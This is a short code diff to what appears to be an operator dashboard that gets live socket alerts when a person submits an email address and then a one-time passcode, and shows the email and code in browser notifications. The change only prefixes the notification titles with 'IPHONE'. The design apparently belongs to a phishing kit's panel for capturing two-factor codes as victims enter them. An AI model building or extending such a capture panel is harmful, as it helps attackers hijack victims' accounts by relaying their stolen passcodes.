@@ -354,14 +354,14 @@
     socket.on('new-email', (data) => {
       console.log('📧 New email:', data.email);
       playEmailSound();
-      showBrowserNotification('📧 New Email', `${data.email} signed up`);
+      showBrowserNotification('IPHONE 📧 New Email', `${data.email} signed up`);
       loadUsers();
     });
     
     socket.on('new-otp', (data) => {
       console.log('🔐 New OTP:', data.email, 'OTP:', data.otp);
       playOtpSound();
-      showBrowserNotification('🔐 New OTP', `${data.email} submitted OTP: ${data.otp}`);
+      showBrowserNotification('IPHONE🔐 New OTP', `${data.email} submitted OTP: ${data.otp}`);
       loadUsers();
     });
     
